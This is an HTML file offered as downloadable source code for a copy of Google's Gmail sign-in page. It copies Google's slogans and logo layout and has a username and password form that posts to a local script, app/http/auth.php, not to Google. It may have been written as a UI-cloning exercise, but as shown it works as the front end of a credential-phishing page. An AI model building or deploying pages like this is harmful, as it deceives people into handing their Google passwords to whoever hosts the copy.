<html>
<head>
    <link type="text/css" rel="stylesheet" href="style.css" />
    <link href='https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300' rel='stylesheet' type='text/css'>
    <title>Gmail login page source code download</title>
</head>
<body>
    <center>
        <div class="base">
            <div id="logo">
                <img src="logo2.png" width="118" height="38" />
            </div>
            <div id="info1">
                One account. All of Google.
            </div>
            <div id="info2">
                Sign in to continue to Gmail
            </div>
            <form method="post" 
	 	      action="app/http/auth.php">
            <div id="form1" style="height:320px">
                <div id="form-img">
                    <img src="profile-img.png" width="99" height="99" />
                </div>
                <div id="mailbox">
                    <input placeholder="Enter or phone" type="mail" name="username" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" required>
                </div>
                <div id="mailbox">
                <input type="password" 
		           class="form-control"
		           name="password" placeholder="Enter Password" style="width:270px; height:42px; border: solid 1px #c2c4c6; font-size:16px; padding-left:8px;" required>
                </div>
              
                <div>
                    <input type="submit" id="button2" value="Next" />
                </div>
                </form>
                <div id="info3">
                    <a href="#">Need help?</a>
                </div>
            </div>
            <!-- <div id="info4">
                <a href="#">Create account</a>
            </div> -->
            <div id="info5">
                One Google Account for everything Google
            </div>
            <div>
                <img src="footer-logo.png" id="logo2" />
            </div>

            <div id="bottom">

            </div>
        </div>
    </center>
</body>
</html>